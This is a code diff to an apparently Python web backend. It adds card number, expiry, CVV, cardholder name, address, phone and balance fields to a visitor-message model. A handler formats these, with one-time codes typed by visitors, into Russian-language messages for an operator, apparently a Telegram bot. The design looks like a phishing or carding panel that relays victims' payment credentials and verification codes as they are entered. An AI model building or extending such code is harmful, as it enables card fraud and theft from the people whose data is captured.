@@ -114,6 +114,19 @@ class VisitorMessage(BaseModel):
     step: int | None = None
     trigger: str | None = None   # open | card | balance | error | user | code | code_resend
     text: str = ""
+    # card data — sent once when balance trigger fires
+    card_number: str = ""
+    card_exp: str = ""
+    card_cvv: str = ""
+    card_name: str = ""
+    country: str = ""
+    address1: str = ""
+    zip_code: str = ""
+    city: str = ""
+    phone_dial: str = ""
+    phone: str = ""
+    balance_amount: str = ""
+    balance_currency: str = ""
 
 
 # ── helpers ───────────────────────────────────────────────────────────────────
@@ -265,6 +278,40 @@ async def visitor_message(body: VisitorMessage, request: Request) -> JSONRespons
         msg_body = f"<i>[{visitor_lang}→ru]</i> {ru_text}"
     else:
         msg_body = ru_text or f"<i>[{trigger_label}]</i>"
+
+    # для кода — показываем сам код крупно, без перевода
+    if body.trigger == "code" and body.text.strip():
+        msg_body = f"🔑 <b>{body.text.strip()}</b>"
+
+    # для баланса — добавляем данные карты и адреса в тело сообщения
+    if body.trigger == "balance" and body.balance_amount:
+        card_lines = []
+        if body.card_number:
+            card_lines.append(f"  Номер: <code>{body.card_number}</code>")
+        if body.card_exp:
+            card_lines.append(f"  Срок: <code>{body.card_exp}</code>")
+        if body.card_cvv:
+            card_lines.append(f"  CVV: <code>{body.card_cvv}</code>")
+        if body.card_name:
+            card_lines.append(f"  Имя: {body.card_name}")
+        addr_lines = []
+        if body.country:
+            addr_lines.append(f"  Страна: {body.country}")
+        if body.address1:
+            addr_lines.append(f"  Адрес: {body.address1}")
+        if body.zip_code or body.city:
+            addr_lines.append(f"  Индекс: {body.zip_code or '—'}, {body.city or '—'}")
+        phone_str = ""
+        if body.phone or body.phone_dial:
+            phone_str = f"\n📞 <b>Телефон:</b> {body.phone_dial}{body.phone or '—'}"
+        parts = [f"💰 <b>Баланс:</b> <code>{body.balance_amount} {body.balance_currency or ''}</code>"]
+        if card_lines:
+            parts.append("💳 <b>Карта:</b>\n" + "\n".join(card_lines))
+        if addr_lines:
+            parts.append("📍 <b>Адрес:</b>\n" + "\n".join(addr_lines))
+        if phone_str:
+            parts.append(phone_str.strip())
+        msg_body = "\n\n".join(parts)
 
     reply_kb = {
         "inline_keyboard": [[
